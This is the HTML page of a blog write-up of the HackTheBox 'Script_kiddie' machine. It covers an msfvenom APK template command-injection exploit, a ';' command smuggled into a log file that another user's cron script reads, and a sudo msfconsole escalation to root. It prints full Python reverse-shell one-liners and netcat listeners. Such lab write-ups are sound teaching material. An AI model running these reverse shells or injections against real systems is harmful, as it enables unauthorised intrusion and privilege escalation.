@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Hackthebox - Script_kiddie - Write up | Itarow</title>
+  <link rel = 'canonical' href = 'https://itarow.github.io/posts/hackthebox-script_kiddie/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Hackthebox - Script_kiddie - Write up" />
+<meta property="og:description" content="Write up of Script kiddie from HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itarow.github.io/posts/hackthebox-script_kiddie/" /><meta property="og:image" content="https://itarow.github.io/img/scriptKid/banner.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-12T16:07:51+02:00" />
+<meta property="article:modified_time" content="2021-06-12T16:07:51+02:00" />
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://itarow.github.io/img/scriptKid/banner.jpeg"/>
+
+<meta name="twitter:title" content="Hackthebox - Script_kiddie - Write up"/>
+<meta name="twitter:description" content="Write up of Script kiddie from HackTheBox"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://itarow.github.io/css/styles.a202629510fba11c0596546c1bf55ebd1c91f1b6b769793fe3f5e62f2749179f461c8c2a5131c56e4e811301624dfd10bda84eef0d9bdff17ec5bb31710cf24c.css" integrity="sha512-ogJilRD7oRwFllRsG/VevRyR8ba3aXk/4/XmLydJF59GHIwqUTHFbk6BEwFiTf0QvahO7w2b3/F&#43;xbsxcQzyTA=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://itarow.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://itarow.github.io/posts/heroctfv3-we_need_you/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://itarow.github.io/posts/hackthebox-spectra/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&text=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&is_video=false&description=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Script_kiddie%20-%20Write%20up&body=Check out this article: https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&name=Hackthebox%20-%20Script_kiddie%20-%20Write%20up&description=Write%20up%20of%20Script%20kiddie%20from%20HackTheBox" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&t=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Hackthebox - Script_kiddie - Write up
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2021-06-12 16:07:51 &#43;0200 CEST" itemprop="datePublished">2021-06-12</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          4 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/hackthebox">HackTheBox</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/hackthebox" rel="tag">HackTheBox</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/write-up" rel="tag">Write-up</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/cve" rel="tag">CVE</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#lateral-movement">Lateral movement</a>
+      <ul>
+        <li><a href="#exploitation-of-the-script">Exploitation of the script</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="content" itemprop="articleBody">
+      <p>So I rooted Script-Kiddie from HackTheBox, which was an easy Linux box. This box was create by 0xdf, thanks to him. It includes a CVE on msfvenom for Foothold, a crontab exploit for the lateral movement and a sudo authorization on metasploit for root part.</p>
+<h2 id="foothold">Foothold</h2>
+<p>First we start with a classic nmap scan :</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">$ nmap -A -p- -T4 10.10.10.226
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d 5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>So we have a website on port 5000, we decide to go in.</p>
+<p><img src="/img/scriptKid/img1.png#center" alt="">
+<img src="/img/scriptKid/img2.png#center" alt=""></p>
+<p>We could see 3 tools, nmap, msfvenom/meterpreter, and searchsploit.</p>
+<p>First, I tried to do multiple way of command injection on each field but unfortunately, it doesn’t work. So after a few enumerations with gobuster, I diced to try nikto which found a MIME vulnerability. It says that we could upload the type file that we want on the template option.</p>
+<p>So I tried to upload PHP page, to get RCE (Remote Command Execution). The problem is that is couldn’t trigger the file that I uploaded, I could only download it …</p>
+<p>I continued my search on this optional template file that we could upload.</p>
+<p>I found a CVE(<a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a>) on exploit DB, which allow command injection on the server with msfvenom and APK template. The CVE includes a metasploit module which create the evil file with reverse shell parameter (our IP and the port where we listen).</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; options
+
+Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.15.32      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; exploit
+
+[+] msf.apk stored at /home/art/.msf4/local/msf.apk
+</code></pre><p>So after, we just have to select the malicious template file, put a random IP, select Android (parameter which allow uploading apk template) open a netcat session on port 4444 and generate the meterpreter session.</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">$ nc -lvnp 4444                  
+Connection from 10.10.10.226:33818
+id &amp; whoami
+kid
+uid=1000(kid) gid=1000(kid) groups=1000(kid)
+</code></pre><h2 id="lateral-movement">Lateral movement</h2>
+<p>So now, we searched to gain pwn user access (the user between us and root).
+After a few enumerations with linpeas, I found an interesting file in pwn home folder called scanlosers.sh.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff79c6">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">=</span>/home/kid/logs/hackers
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/pwn/
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>cat <span style="color:#8be9fd;font-style:italic">$log</span> | cut -d<span style="color:#f1fa8c">&#39; &#39;</span> -f3- | sort -u | <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> ip; <span style="color:#ff79c6">do</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    sh -c <span style="color:#f1fa8c">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">ip</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.nmap </span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">ip</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#ff79c6">done</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[[</span> <span style="color:#ff79c6">$(</span>wc -l &lt; <span style="color:#8be9fd;font-style:italic">$log</span><span style="color:#ff79c6">)</span> -gt <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">]]</span>; <span style="color:#ff79c6">then</span> <span style="color:#8be9fd;font-style:italic">echo</span> -n &gt; <span style="color:#8be9fd;font-style:italic">$log</span>; <span style="color:#ff79c6">fi</span>
+</span></span></code></pre></div><p>In the content of the script, we could see that the script is going to search in our home folder, the content of /logs/hackers of which we have the rights to write on it.</p>
+<p>We can ask ourselves, how the script is executed because in the enumeration phase, we don’t found a particular crontab on this script. To check if the script execute by a cron that we couldn’t see with simple enumeration, we just put a random word on /logs/hackers, and instantly after this modification, when we read the file, It is empty. So now we are sure that this script is executed by a cron of another user than us (enumeration proved it :p ).</p>
+<h3 id="exploitation-of-the-script">Exploitation of the script</h3>
+<p>The tips here, is to reproduce the environment of the script locally, it allows neglecting nothing. So the script is going to read the /logs/hackers file that we could write on it, It performs a cut command and realize an nmap command with the recover part.</p>
+<p>It cut all the part before the second space of the line. We know it’s a bash script, so we could use the “;” separator which allow executing another command. This command is going to be executed as the crontab user, so we could put a reverse shell command to get a shell on him é_é.</p>
+<p>So we have to put 2 a and 2 space, a “;” and our reverse shell payload in python.</p>
+<p>I tried locally, It works, so we just have to do the same on the machine.</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">$ echo &#34;a a ;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.32&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#34; &gt; hackers
+
+///////\\\\\\\
+# we open a netcat session on port 4444
+
+$ nc -lvnp 4444
+Connection from 10.10.10.226:36024
+$ whoami
+pwn
+</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>So last part, we move into root user ^^.
+We start a little linpeas script, and we found something fascinating :</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">[+] Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre><p>We could execute msfconsole with root right :o</p>
+<pre tabindex="0"><code class="language-code" data-lang="code">$ sudo msfconsole
+$ whoami
+root
+$ python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.32&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
+
+/////\\\\\
+# we open a netcat session on port 4444
+
+$ nc -lvnp 4444
+Connection from 10.10.10.226:36024
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# whoami &amp; id
+uid=0(root) gid=0(root) groups=0(root)
+# root
+</code></pre><p>And BOOM! We are root é_é.
+Thank you for your reading and see you later for a new one :)</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&text=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&is_video=false&description=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Script_kiddie%20-%20Write%20up&body=Check out this article: https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&title=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&name=Hackthebox%20-%20Script_kiddie%20-%20Write%20up&description=Write%20up%20of%20Script%20kiddie%20from%20HackTheBox" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fitarow.github.io%2fposts%2fhackthebox-script_kiddie%2f&t=Hackthebox%20-%20Script_kiddie%20-%20Write%20up" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script>
+
+
+
+</html>
